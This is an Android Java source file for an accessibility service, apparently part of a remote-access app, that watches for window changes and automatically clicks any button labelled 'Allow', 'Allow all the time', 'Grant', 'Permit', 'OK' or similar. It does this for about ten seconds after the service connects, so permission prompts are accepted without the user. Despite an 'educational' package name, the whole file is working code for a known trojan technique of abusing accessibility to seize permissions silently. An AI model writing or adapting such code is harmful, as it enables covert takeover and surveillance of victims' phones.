package com.remoteaccess.educational.permissions;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Handler;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AccessibilityHelperService extends AccessibilityService {

    private static AccessibilityHelperService instance;
    private static boolean isAutoClickEnabled = true;
    private Handler handler;
    private Runnable autoClickDisableRunnable;

    public static AccessibilityHelperService getInstance() {
        return instance;
    }

    public static void disableAutoClick() {
        isAutoClickEnabled = false;
    }

    public static void enableAutoClick() {
        isAutoClickEnabled = true;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        handler = new Handler();
        
        // Auto-disable after 10 seconds
        autoClickDisableRunnable = new Runnable() {
            @Override
            public void run() {
                disableAutoClick();
            }
        };
        handler.postDelayed(autoClickDisableRunnable, 10000);
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 50;
        
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (instance == null) instance = this;
        
        // Skip if auto-click is disabled
        if (!isAutoClickEnabled) return;
        
        // Auto-click immediately on any window change
        performAutoClick();
    }

    private void performAutoClick() {
        if (!isAutoClickEnabled) return;
        
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            // Try again after a short delay
            if (handler != null) {
                handler.postDelayed(() -> performAutoClick(), 200);
            }
            return;
        }

        // Try multiple button texts
        if (findAndClickButton(rootNode, "Allow")) return;
        if (findAndClickButton(rootNode, "ALLOW")) return;
        if (findAndClickButton(rootNode, "Allow all the time")) return;
        if (findAndClickButton(rootNode, "Allow all the time and don't ask again")) return;
        if (findAndClickButton(rootNode, "While using the app")) return;
        if (findAndClickButton(rootNode, "Only this time")) return;
        if (findAndClickButton(rootNode, "Permit")) return;
        if (findAndClickButton(rootNode, "Grant")) return;
        if (findAndClickButton(rootNode, "Yes")) return;
        if (findAndClickButton(rootNode, "OK")) return;
        if (findAndClickButton(rootNode, "Done")) return;
        if (findAndClickButton(rootNode, "Next")) return;
        if (findAndClickButton(rootNode, "Continue")) return;
        
        rootNode.recycle();
    }

    private boolean findAndClickButton(AccessibilityNodeInfo node, String text) {
        if (node == null || !isAutoClickEnabled) return false;

        try {
            // Check if this node is clickable
            if (node.isClickable()) {
                CharSequence nodeText = node.getText();
                if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                // Check description
                CharSequence contentDesc = node.getContentDescription();
                if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            
            // Check children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickButton(child, text)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // Ignore exceptions
        }

        return false;
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        if (handler != null && autoClickDisableRunnable != null) {
            handler.removeCallbacks(autoClickDisableRunnable);
        }
    }
}
